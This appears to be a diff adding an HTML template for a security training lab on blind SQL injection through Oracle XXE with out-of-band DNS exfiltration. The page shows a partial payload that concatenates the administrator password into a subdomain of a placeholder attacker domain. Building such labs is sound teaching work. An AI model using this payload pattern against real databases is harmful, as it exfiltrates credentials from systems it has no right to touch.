@@ -1,0 +1,28 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<div class="text-center py-5">
+    <span class="lab-badge" style="background-color: #58269e;">LAB 16: OOB EXFILTRATION</span>
+    <h2 class="mt-2">Blind SQLi with Out-of-Band Exfiltration</h2>
+    <p class="text-muted">
+        The application is vulnerable to Blind SQLi via Oracle XXE.<br>
+        You must verify the injection by forcing a DNS lookup that contains the <strong>Administrator Password</strong> in the subdomain.
+    </p>
+
+    <div class="alert alert-secondary d-inline-block mt-3">
+        <strong>Goal:</strong> Construct a payload like:<br>
+        <code>http://' || (SELECT password...) || '.YOUR-DOMAIN.com</code>
+    </div>
+    
+    <div class="mt-4">
+        <a href="/logs" class="btn btn-warning position-relative">
+            <i class="bi bi-eye"></i> View DNS/HTTP Logs
+            <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger">
+                New
+            </span>
+        </a>
+        <br><br>
+        <a href="/login" class="btn btn-outline-primary btn-sm">Login as Admin</a>
+    </div>
+</div>
+{% endblock %}
